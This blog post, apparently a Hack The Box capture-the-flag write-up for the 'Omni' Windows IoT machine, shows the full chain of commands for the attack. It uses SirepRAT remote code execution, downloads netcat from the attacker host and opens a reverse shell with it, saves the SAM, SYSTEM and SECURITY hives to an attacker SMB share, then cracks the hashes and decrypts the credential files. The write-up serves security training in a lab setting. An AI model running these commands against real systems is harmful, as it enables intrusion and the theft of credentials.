---
layout: post
title:  "Hack The Box - Omni Writeup"
date:   2021-01-09 06:00:00
image: 
  path: /assets/img/htb/HTB-Academy/Header.png
author: Ryan
---

- Table of Contents
{:toc .large-only}

*[Hack The Box](https://hackthebox.eu) is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with thousands of people in the security field.*  

Omni is an Easy level "Other" machine. Boxes typically fall under the "Linux" or "Windows" category, so this deviation from the norm should lead to a fun and interesting challenge. Based on the creator and community statistics, this box has a decent balance across all areas, but leaning slightly more towards realistic configurations exploited with existing CVEs.  
![Statistics](/assets/img/htb/HTB-Omni/Statistics.png)

## Information Gathering

#### Nmap
By scanning the target IP with Nmap, we're able to find what ports are open (`-p`), while fingerprinting the services running and their versions (`-sV`). We're also running the default set of scripts (`-sC`), which can help find additional information and automate some of our initial steps. Once the scan is completed, nmap will write the results to our Extracts folder (`-oA`)  
`>> nmap -p135,5985,8080,29817,29819,29820 -sV -sC -Pn -oA Extracts/Omni 10.10.10.204`  
![Nmap](/assets/img/htb/HTB-Omni/nmap.png)

* **Port 135 - msrpc**: Microsoft Remote Procedure Call, is used to negotiate communication over ports 1025 - 65535. 
* **Port 5985 - upnp**: Although nmap shows this port is hosting some type of IIS server, port 5985 is also used for [WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/portal). If we're able to find credentials, it's posible this will be our way into the machine.
* **Port 8080 - upnp**: Another reference to IIS here, it looks like one of our nmap scripts discovered a "Windows Device Portal" application requiring basic authentication. 
* **Ports 29817, 29819, 29820**: After a bit of research, it appears that these ports are related to WPCon, WPConTCPPing, WPPingSirep, and WPConProtocol2. The Arcserve reference could also be useful later on.

### Windows IoT
Looking into the "Windows Device Portal" finding, we're led to documentation around the Windows IoT platform. We're likely targetting an IoT device, which should narrow down our focus with CVEs and exploits.

## Foothold
Combining the discovery of a Windows IoT device with the higher ports, we find an exploit against the Sirep Test Service that allows for Remote Code Execution. We can leverage this using a simple python tool called [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT), along with a list of writeble directories to work with.  
![Writeable](/assets/img/htb/HTB-Omni/Foothold_Writeable.png)

### Upload Netcat
Our first step to gaining access on the machine is to upload a netcat executable. This will allow us to create a connection back to our machine and execute additional commands. Start up a simple python server to host our nc46.exe.  
`>> python -m SimpleHTTPServer`

Next, we'll execute a command on the target server to request our file and download it to the Windows Temp directory.  
`>> python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell -c Invoke-WebRequest -OutFile C:\\Windows\\Temp\\nc64.exe -URI 10.10.14.28:8000/nc64.exe" --v`

### Reverse Shell
With the netcat executable in place, our next step is to create a listener on our local machine.  
`>> nc -lvnp 4444`  

We'll send a second command to the target server, this time connecting back to our listener and gaining shell as the Omni user.  
`>> python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\Temp\\nc64.exe 10.10.14.28 4444 -e cmd.exe"`  
![Reverse Shell](/assets/img/htb/HTB-Omni/Foothold_Shell.png)  

### Locating Credentials
Typically, the user flag can be found easily in the Desktop of the user you gained access with. However, this box seems to have a different setup than most and will require us to do a little extra digging. We can search for the `user.txt` file with Powershell.  
`>> powershell -c get-childitem -path c:\ -filter user.txt -recurse -erroraction silentlycontinue -force`  
![Flag Search](/assets/img/htb/HTB-Omni/Foothold_Search.png)  

Reading the contents of `C:\Data\Users\app\user.txt` leads to some Powershell credential information. Unfortunately, we can't decrypt the flag inside yet because it belongs to the app user.  
![User File](/assets/img/htb/HTB-Omni/Foothold_User.png)  

### Extracting SAM, SYSTEM, SECURITY files
Although there is an alternative path on this box involving a batch file left behind during creation, we'll be looking at the intended solution dumping user hashes from the registry. The Security Account Manager (or SAM file) is a database containing all the password hashes for user accounts. The SYSTEM and SECURITY files will allow us to extract the hashes for cracking.

We'll start off by configuring an SMB Share on our local machine to tansfer the files to.  
`>> sudo smbserver.py share . -smb2support -username omni -password omni`

With the share running, we can connect to it from the Omni shell using the credentials we set up.  
`>> net use \\10.10.14.15\share /u:omni omni`

And now, we're able to extract the files while sending them to our machine:  
`>> reg save HKLM\sam \\10.10.14.15\share\SAM`  
`>> reg save HKLM\system \\10.10.14.15\share\SYSTEM`  
`>> reg save HKLM\security \\10.10.14.15\share\SECURITY`  
![SMB Share](/assets/img/htb/HTB-Omni/SMB_Share.png)

### Extracting Hashes
With the files we need successfully sent to our local machine, we're able to extract the hashes inside using `secretsdump.py`.  
`>> secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL`  
![Hashes](/assets/img/htb/HTB-Omni/Hashes.png)

### Cracking Hashes
Our last step to getting user credentials is to run the hashes through `hashcat` and see what we can find.  
`>> .\hashcat.exe -a0 -m1000 .\hash.txt .\rockyou.txt --username`  
![Hashes Cracked](/assets/img/htb/HTB-Omni/Hashes_Cracked.png)

Looks like we've got credentials for the app user!
`app:mesh5143`

### User Flag
Authenticating with the app user credentials against port 8080 results in access to the Windows Device Portal we previously discovered. Under `Processes > Run Command`, we're able to execute arbitrary commands on the system. Let's get the User flag  
`>> powershell -c $credential = Import-CliXml -Path C:\Data\Users\app\user.txt;$credential.GetNetworkCredential().Password`
![User Flag](/assets/img/htb/HTB-Omni/User_Flag.png)  

## Privilege Escalation
In addition to the user flag file, the app user's directory contains an `iot_admin.xml` file. Executing the previous command against the new file results in gaining the admin password `_1nt3rn37ofTh1nGz`.

Reauthenticating to the dashboard using the administrative credentials, we're shown an identical screen as the app user. Again, navigating to `Processes > Run Command` will allow us to execute system commands, this time as the admin. 

### Root Flag
`>> powershell -c $credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt;$credential.GetNetworkCredential().Password`  
![Root Flag](/assets/img/htb/HTB-Omni/Root_Flag.png)  